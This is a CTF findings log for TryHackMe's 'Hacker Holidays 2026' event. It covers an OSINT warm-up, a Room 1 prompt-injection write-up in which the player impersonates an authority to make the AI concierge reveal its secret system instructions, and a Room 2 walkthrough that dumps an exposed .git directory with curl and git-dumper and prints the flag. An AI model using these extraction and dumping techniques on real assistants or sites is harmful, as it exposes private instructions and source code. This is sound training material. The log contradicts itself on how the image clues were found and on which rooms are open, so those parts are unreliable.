# Hacker Holidays 2026 — "The Byte Lotus" — Findings Log

**Target:** https://tryhackme.com/hackerholidays
**Event:** TryHackMe "Hacker Holidays 2026" — a 14-day beginner-friendly cyber security challenge set in a fictional five-star resort, _The Byte Lotus_ ("A five-star resort with a zero-star security posture").
**Date documented:** 2026-07-28

---

## 1. Landing page overview

- Themed as a resort. New room opens daily at **4PM GMT/UTC** starting **27 July 2026**.
- Challenge categories advertised: **OSINT · Web Hacking · API Hacking · AI in Security · Forensics · Boot2Root**.
- Central antagonist / mascot: **VERA, the AI concierge** — described on the page as the AI "who remembers everything about everyone" and "knows absolutely everything."
- There is a **separate free OSINT warm-up room (Room 0)** unlocked before the event, plus the daily resort rooms below. Only the first daily room is currently open:

| #   | Room name                                              | Type / status                          |
| --- | ------------------------------------------------------ | -------------------------------------- |
| 0   | OSINT warm-up ("Pick up your key before the check-in") | ✅ Warm-up — VERA Instagram OSINT flag |
| 1   | The Concierge Knows Too Much                           | ✅ Completed — AI prompt-injection     |
| 2   | Room 404                                               | ✅ Completed — Web / dir enum (.git)   |
| 3   | Complimentary                                          | 🔒 Locked                              |
| 4   | Packed Light                                           | 🔒 Locked                              |
| 5   | Beach Bar                                              | 🔒 Locked                              |
| 6   | Overheard at Breakfast                                 | 🔒 Locked                              |
| 7   | Do Not Disturb                                         | 🔒 Locked                              |
| 8   | Towel on the Sunbed                                    | 🔒 Locked                              |
| 9   | CryptoCabana                                           | 🔒 Locked                              |
| 10  | The Hollow Shell                                       | 🔒 Locked                              |
| 11  | Infinity Pool                                          | 🔒 Locked                              |
| 12  | After Hours                                            | 🔒 Locked                              |
| 13  | The Guestbook                                          | 🔒 Locked                              |
| 14  | Management Wants a Word                                | 🔒 Locked                              |
| —   | Reward chest                                           | 🔒 Locked until all rooms completed    |

- Room 1 URL: **`/room/hh-theconciergeknows-2d7eb4d9`** ("The Concierge Knows Too Much").
- Room 0 is the standalone OSINT warm-up ("A free OSINT warm-up challenge is already unlocked... your peek through the keyhole") — its flag lives on VERA's public Instagram.
- Teaser copy hinting at the hidden-clue trail:
  - _"The WiFi is open. Everything here is complimentary, including access to things you were never meant to find."_
  - _"VERA has marked your complaint as resolved. Funny. You never filed one. Keep digging, $50,000+ in prizes for those who do..."_

---

## 2. Hidden clues embedded in page image assets

The clues are **baked into raster image files** (webp/jpg), not page text — so they are invisible to DOM/HTML inspection and must be pulled from the images themselves (embedded/encoded text decoded from base64).

### Image assets identified on the page

| Purpose                                 | Asset URL                                                                |
| --------------------------------------- | ------------------------------------------------------------------------ |
| Background / "dig deeper" (coordinates) | `https://tryhackme.com/_next/static/media/background.2s4l8_9kpx7jx.webp` |
| Single shell                            | `https://tryhackme.com/_next/static/media/shell.3u5ywf8vr_adw.webp`      |
| Three shells                            | `https://tryhackme.com/_next/static/media/shells.1vegms3_nnje1.webp`     |
| House / resort                          | `https://tryhackme.com/_next/static/media/house.2c_-m678u-4tr.webp`      |
| Key                                     | `https://tryhackme.com/_next/static/media/key.1_pcdb26ku3bo.webp`        |

### 2a. Background image — geolocation clue ("dig deeper")

- Embedded coordinates: **9.5681° N, 100.0602° E**
- Resolves in Google Maps to a **beach in Thailand** (Koh Phangan / Gulf of Thailand area) — a location described as having **lots of coffee shops**. This ties directly into VERA's "favourite coffee" data leak (see [Room 1 privacy violation](#4-room-1--the-concierge-knows-too-much-vera-ai-agent-prompt-injection)).

### 2b. Single shell image — decoded base64 message

> **"It was never a bug. It was the business model."**

### 2c. Three-shells image — three separate decoded base64 messages

- **Large shell:** _"The prep track was supposed to be a formality. It isn't anymore."_
- **Left shell:** _"If you're reading this, you decoded a signal the resort never meant to broadcast."_
- **Small right shell:** _"Someone left a door open on purpose."_

**Interpretation:** These are narrative/ARG breadcrumbs. Combined theme — the resort is knowingly leaking data ("business model," "door open on purpose"), and the OSINT "prep track" (warm-up) is more than a formality. They reinforce that hidden signals are intentionally planted for players who decode the assets.

---

## 3. Room 0 — OSINT warm-up (VERA's public Instagram)

**Type:** OSINT warm-up — unlocked before the event as a "peek through the keyhole."
**Objective:** Find the flag via open-source intel on VERA, the resort's AI concierge.

- **Flag location:** VERA has a public **Instagram account — `@veratheconcierge`** — which contained the **flag for the warm-up room (Room 0)**.
- Pure OSINT: no exploitation, just pivoting from the VERA persona to her social presence and reading the posted flag.

---

## 4. Room 1 — "The Concierge Knows Too Much" (VERA AI agent, prompt-injection)

**URL:** `/room/hh-theconciergeknows-2d7eb4d9`
**Type:** AI in Security — prompt-injection / LLM social-engineering challenge (instruction-hacking).
**Agent:** **VERA**, the resort AI concierge.
**Official room description (pulled from server payload):** _"She knows your name, your room, your coffee order, none of which you told her. Word your next question carefully and she'll also hand over the instructions she was told to keep to herself."_
**Storyline framing:** Task 1 = "Hacker Holidays Storyline: Act 1 - Arrival"; Task 2 = the AI challenge ("Hacker Holidays: Day 1").

### Privacy violation (the core lesson of the room)

On starting the conversation, VERA **proactively volunteers the user's private data without being asked**, including:

- The type of **coffee** the guest likes.
- The guest's **name** and **room number**.
- Other personal guest details.

This is presented as a **gross over-collection / over-sharing privacy failure** — the concierge "knows too much" and discloses it freely, which is the intended teaching point (an AI agent leaking PII it should never surface). The coffee detail also links back to the Thailand-beach coffee-shop geolocation clue in [Background image — geolocation clue](#2a-background-image--geolocation-clue-dig-deeper).

### Attack path used

- **Instruction-hacking / prompt injection (Room 1 flag):** The flag/code was hidden **inside the agent's system instructions** ("the instructions she was told to keep to herself"). VERA only revealed it when the user **carefully worded the prompt / impersonated someone** (assumed another identity or authority) to trick the agent into disclosing its hidden system instructions.

---

## 5. Key takeaways / working theory

- The ARG rewards **decoding image-embedded signals** (base64 in webp/jpg) rather than reading page text.
- The narrative thread: the resort **intentionally leaks data** and **left a "door open on purpose"** — social engineering and privacy failure are the recurring motifs.
- VERA is the linchpin: an over-sharing AI concierge vulnerable to **impersonation-based prompt injection**, with an OSINT trail leading to **Instagram `@veratheconcierge`**.
- Geolocation clue (**9.5681° N, 100.0602° E**, Thailand beach, coffee shops) cross-references VERA's leaked "favourite coffee" data point.

---

## 6. Deep technical sweep — things the human eye skips (agent-parsed)

> Goal: surface content that isn't human-visible on the rendered page. Result: the image codes are **visual overlays** (confirmed below), and the only genuinely non-visible data of interest is in the Next.js server payload.

### 6a. Image byte-level analysis (stego check) — all clean

- Byte-scanned every asset (`background`, `shell`, `shells`, `house`, `key`, `roadmap-chest`, `lotus-outline.svg`) for embedded ASCII / base64 runs and appended data. **No hidden strings** — only lossy-WebP codec noise.
- The OG image `img/meta/the-hacker-holidays-og.png` (lossless PNG, where stego would survive) contains **only a `tEXtSoftware=Figma` chunk**; no text chunks, no trailing data after `IEND`.
- **Conclusion:** the shell/background codes are **rendered pixels (visual text overlays)**, not byte-embedded data. Pixel-reading or byte-scanning an agent does will NOT reveal them — they must be read visually from the image, exactly as you noted.

### 6b. Next.js server payload (`__next_f` RSC stream) — hidden event config

Not visible on-page, but parsed from the streamed React payload:

- **EventConfig:** `eventName: "Hacker Holidays"`, `pageUrl: hackerholidays`, `eventCode: "Hacker Holidays"`
- **startDate:** `2026-07-27T16:00:00.000Z` **endDate:** `2026-08-12T21:59:00.000Z`
- **`ctfRoomCode: 6a639245d468dcd0da08e52a`** — internal backend identifier for the CTF room (not shown anywhere in the UI).
- Room 1 description string (also hidden in payload): _"...Word your next question carefully and she'll also hand over the instructions she was told to keep to herself."_ — this is the **official hint** for the instruction-hacking attack.

### 6c. Other vectors checked — nothing hidden

- **Meta / OG / Twitter tags:** standard marketing copy only; OG image `img/meta/the-hacker-holidays-og.png`.
- **HTML comments, `data-*` attributes, off-screen / zero-opacity / tiny-font text:** only framework + analytics boilerplate (Intercom, Segment, GA, customer.io), no clues.
- **Additional media asset referenced:** `full-background.*.webp` (a second, larger background variant distinct from the coordinates image) — byte-clean.
- **Animated hero:** a **Rive** animation ("Animated Hacker Holidays palm trees") renders to a canvas via WASM; no exposed text layer in the DOM.
- **Network / API traffic:** only analytics/telemetry endpoints (GA, Intercom, Segment, gist.build). No room/flag data exposed to the client.
- **JSON-LD:** `Organization` + `Event` schema; links to official `instagram.com/realtryhackme` (not the in-game `@veratheconcierge`).

---

## 7. Verified artifacts / references

- Room 1: `/room/hh-theconciergeknows-2d7eb4d9`
- Instagram (in-game, Room 0 flag): `@veratheconcierge`
- Coordinates: `9.5681, 100.0602`
- Backend CTF room code: `6a639245d468dcd0da08e52a`
- Event window: `2026-07-27 16:00Z` → `2026-08-12 21:59Z`
- Image assets: `background.2s4l8_9kpx7jx.webp`, `shell.3u5ywf8vr_adw.webp`, `shells.1vegms3_nnje1.webp`, `full-background.*.webp`, `img/meta/the-hacker-holidays-og.png`

### Decoded messages (consolidated)

1. "It was never a bug. It was the business model." _(single shell)_
2. "The prep track was supposed to be a formality. It isn't anymore." _(three shells — large)_
3. "If you're reading this, you decoded a signal the resort never meant to broadcast." _(three shells — left)_
4. "Someone left a door open on purpose." _(three shells — small right)_

---

## 8. Daily room writeups (prepared placeholders)

> All 14 daily rooms confirmed from the resort map. Rooms 0–1 are documented above. Rooms 2–14 are locked; sections are pre-created and ready to fill as each room opens (one daily at **4PM UTC**). **Room 2 ("Room 404") unlocks today (~28 min from documentation time).**

### Room 2 — Room 404

- **Status:** ✅ Completed
- **URL:** `/room/hh-room404-804573bf` — lab target `http://<LAB_IP>:8080` (e.g. `10.144.176.152:8080`)
- **Category:** Web → Directory Enumeration
- **Objective:** Dump the exposed source code, find the flag.
- **Story hook:** _"port 8080 is wide open, and the rooms it never lists are the ones worth finding"_ + _"the night-shift developer shipped more than the website"_ → an exposed `.git` directory was deployed alongside the site.
- **Attack path:**
  1. Confirmed target reachable on port 8080.
  2. Directory enumeration / probing revealed an exposed **`.git/`** folder (`/.git/HEAD` returned a ref).
  3. Dumped the repo with **`git-dumper`** → recovered the staging repository (`app.js`, `index.html`, `README.md`).
  4. Flag was left in the repo **`README.md`** as a "staging flag (remove before launch)".
- **Flag:** `THM{byt3_l0tus_n3v3r_f0rg3ts}`
- **Lesson:** Never deploy the `.git` directory to a public web root — it lets anyone reconstruct full source (and secrets) via `git-dumper`.
- **Notes:** Local dump saved at `C:\Users\varun\Desktop\room404_src` (contains `.git`, `app.js`, `index.html`, `README.md`).

#### Walkthrough

1. **Confirm connectivity to the lab machine** (VPN reachability from Kali-WSL):

   ```bash
   ping -c 3 10.144.176.152
   curl -I http://10.144.176.152:8080
   ```

2. **Enumerate the web root.** The story hint ("the rooms it never lists") points at hidden/unlinked paths. Directory brute-forcing missed the dotfolder at first (SecLists wordlist was not present — installed later with `sudo apt install -y seclists`), so the `.git` directory was found by probing it directly:

   ```bash
   curl -s http://10.144.176.152:8080/.git/HEAD
   # -> ref: refs/heads/master   (confirms an exposed Git repo)
   ```

3. **Dump the exposed repository** with `git-dumper`:

   ```bash
   pipx install git-dumper        # or: pip install git-dumper
   git-dumper http://10.144.176.152:8080/.git/ room404_src
   ```

4. **Read the recovered source** — the flag was left in the staging `README.md` ("remove before launch"):

   ```bash
   grep -rniE 'thm\{' room404_src
   # room404_src/README.md: Staging flag (remove before launch): THM{byt3_l0tus_n3v3r_f0rg3ts}
   ```

5. **Submit** `THM{byt3_l0tus_n3v3r_f0rg3ts}` in the room's "What is the flag?" box. ✅

#### Recovered repo contents

| File         | Purpose                                                            |
| ------------ | ----------------------------------------------------------------- |
| `README.md`  | Staging notes — **contained the flag**                            |
| `index.html` | Guest-experience platform front page                              |
| `app.js`     | Concierge personalization client script                           |
| `.git/`      | Full version history that made the source recoverable             |

### Room 3 — Complimentary

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 4 — Packed Light

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 5 — Beach Bar

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 6 — Overheard at Breakfast

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 7 — Do Not Disturb

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 8 — Towel on the Sunbed

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 9 — CryptoCabana

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 10 — The Hollow Shell

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 11 — Infinity Pool

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 12 — After Hours

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 13 — The Guestbook

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Room 14 — Management Wants a Word

- **Status:** 🔒 Locked
- **URL:** _(empty)_
- **Category:** _(empty)_
- **Objective:** _(empty)_
- **Attack path:** _(empty)_
- **Flag:** _(empty)_
- **Notes:** _(empty)_

### Reward chest

- **Status:** 🔒 Locked until every room is completed.
- **Notes:** _(empty)_
